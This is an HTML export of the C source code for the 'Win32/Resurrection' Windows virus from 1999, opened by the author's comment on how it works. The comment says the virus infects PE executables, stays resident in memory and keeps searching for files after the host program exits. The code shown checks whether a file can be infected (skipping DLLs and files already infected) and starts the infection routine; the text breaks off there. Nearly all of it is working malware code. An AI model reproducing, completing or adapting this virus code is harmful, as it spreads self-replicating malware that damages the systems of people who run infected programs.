<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">////////////////////////////////////////////////////////////////////
//
// Win32/Resurrection
//
// Coded in late June'99/July'99/[VX vacations]/December'99
//
// (c)1999 Tcp/29A (tcp@cryogen.com)
//
// This is my 1st Windows virus (at last:) and the first coded by 
// me in the last 2 years.
//
// It is a PE memory resident appending virus fully written in C.
// I think it's the first virus written in C that doesn't change 
// the NewExe pointer.
// It could be also the 1st resident virus for Alpha machines running
// NT. If you can compile and test it in Alpha, please send me a mail.
//
//
// How the virus work?
// - It creates a low priority thread that searchs and infects files.
// - It adds its sections reading them from memory, relocates the
//   code/data and fixes the relocs (then the virus needs always
//   its own reloc section).
//   It imports the host import section, replacing the ExitProcess
//   call to ExitThread; then the virus will be the main thread and
//   it can continue searching for files even when host has finnished.
// - If the file's last section is the reloc section, the virus 
//   joins this section with its reloc section so if the file is
//   not loaded at its preferred address the system will reloc it
//   and the virus.
//
// The virus is called Resurrection because it's my resurrection in
// the VX scene.
// Unfortunately, I hadn't time to code the Resurrection payload: 
// using OLE automation and the C:\CLASS.SYS from W97M/Class (or 
// the one from Ethan) it could resurrect the virus.
// Then I coded a simple payload that changes the captions in
// MessageBoxes used by the host.
// 
// Sorry for the obfuscated C and poorly optimized code, but it
// works (i hope) and, hey, it's a virus :)
//
// This virus is dedicated to Jacky Qwerty, we'll miss you. And to
// 29Aers for don't kicking a lazy and improductive member as I am ;)
//
// Well, now i got another 2 years credit hahaha (not!)
//
//    Tcp.
//
////////////////////////////////////////////////////////////////////
</span><span class="sc0">

</span><span class="sc2">/////////////
// Includes
/////////////
</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
</span><span class="sc0">

</span><span class="sc2">/////////////////////
// Defines
/////////////////////
</span><span class="sc0">
</span><span class="sc9">#define MEMALLOC(x) GlobalAlloc(GPTR, x)
#define MEMFREE(x)  GlobalFree(x)
</span><span class="sc0">

</span><span class="sc2">/////////////////////
// Type definitions
/////////////////////
</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">RelocOfs</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc4">12</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">RelocType</span><span class="sc10">:</span><span class="sc0">  </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">IMAGE_RELOCATION_DATA</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">////////////
// Globals
////////////
</span><span class="sc11">IMAGE_NT_HEADERS</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">IDosHeader</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">IMAGE_NT_HEADERS</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Generation</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">VirusSections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">FirstVirusSection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">VirusCodeSection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">VirusImportSection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">VirusImportSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">VirusRVAImports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">HostRVAImports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">VirusRelocSection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">VirusRelocSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">VirusRelocSizeDir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">OfsSections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">VirusBaseRVA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">VirusEP</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">HostEP</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">//// Fix for Visual C 5.0 heap
//extern __small_block_heap;
</span><span class="sc0">


</span><span class="sc2">//////////////
// Functions
//////////////
</span><span class="sc0">

</span><span class="sc2">/////////////////////////////////////
// GetProcAddress for ordinal imports
/////////////////////////////////////
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">GetProcAddressOrd</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">Base</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">NFunc</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">IMAGE_NT_HEADERS</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">DLLHeader</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Exports</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">AddrFunctions</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">DLLHeader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_NT_HEADERS</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">Base</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">Base</span><span class="sc10">)-&gt;</span><span class="sc11">e_lfanew</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Exports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">Base</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">DLLHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">AddrFunctions</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">Base</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Exports</span><span class="sc10">-&gt;</span><span class="sc11">AddressOfFunctions</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">Base</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">AddrFunctions</span><span class="sc10">[</span><span class="sc11">NFunc</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">Exports</span><span class="sc10">-&gt;</span><span class="sc11">Base</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc2">//////////////////////////////////
// Check file and read PE header
//////////////////////////////////
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ReadPEHeader</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">FHandle</span><span class="sc10">)</span><span class="sc2">//FILE * FHandle)
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc11">FileHeader</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">SizeSections</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">BytesRead</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">return</span><span class="sc0">
     </span><span class="sc10">(</span><span class="sc0">      </span><span class="sc2">// Read file header
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FileHeader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_DOS_HEADER</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">BytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">
       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">BytesRead</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_DOS_HEADER</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">// Check if EXE file
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">e_magic</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">IMAGE_DOS_SIGNATURE</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">// Seek to NewExe header
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">e_lfanew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_BEGIN</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">// Read header
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">PEHeader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_NT_HEADERS</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">BytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">
       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">BytesRead</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_NT_HEADERS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">// Check if PE file
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">Signature</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">IMAGE_NT_SIGNATURE</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">// Alloc memory for file sections + virus sections
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SizeSections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">VirusSections</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_SECTION_HEADER</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">
       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Section</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MEMALLOC</span><span class="sc10">(</span><span class="sc11">SizeSections</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">
       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">OfsSections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_CURRENT</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> 
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">// Read PE sections
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SizeSections</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">BytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">
       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">BytesRead</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SizeSections</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">// Check if there is enough room for our sections
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_CURRENT</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">VirusSections</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_SECTION_HEADER</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfHeaders</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">// Only infect when entry point belongs to 1st section
</span><span class="sc0">            </span><span class="sc2">// Avoid reinfections and compressors (usually perform virus checks)
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">AddressOfEntryPoint</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">// Skip DDLs
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">!(</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">Characteristics</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">IMAGE_FILE_DLL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">// Skip files with overlays or not aligned to file alignment
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_END</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">PointerToRawData</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
       </span><span class="sc10">&amp;&amp;</span><span class="sc0">   </span><span class="sc2">//Check if the host will overwrite our code with its unitialized data (not present in disk)
</span><span class="sc0">       </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">Misc</span><span class="sc10">.</span><span class="sc11">VirtualSize</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc2">///////////////////////////////////////
// Translates a RVA into a file offset
///////////////////////////////////////
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">RVA2Ofs</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">NSect</span><span class="sc10">;</span><span class="sc0">
  
  </span><span class="sc11">NSect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">NSect</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">NSect</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">NSect</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">NSect</span><span class="sc10">++;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">NSect</span><span class="sc10">].</span><span class="sc11">PointerToRawData</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">NSect</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">));</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc2">////////////////////////////////////////////
// I can't remember what this function does
////////////////////////////////////////////
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">InfectFile</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">FHandle</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Relocations</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">HostRelocs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Ptr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">IMAGE_BASE_RELOCATION</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">RelocBlock</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">IMAGE_RELOCATION_DATA</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">PtrReloc</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc2">// Let's do some initializations
</span><span class="sc0">  </span><span class="sc11">Section</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Relocations</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HostRelocs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ReadPEHeader</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">))</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">SectionRVA</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">HostNSections</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">HostRelocsSize</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">BytesRead</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">HostEP</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">AddressOfEntryPoint</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc10">;</span><span class="sc0">

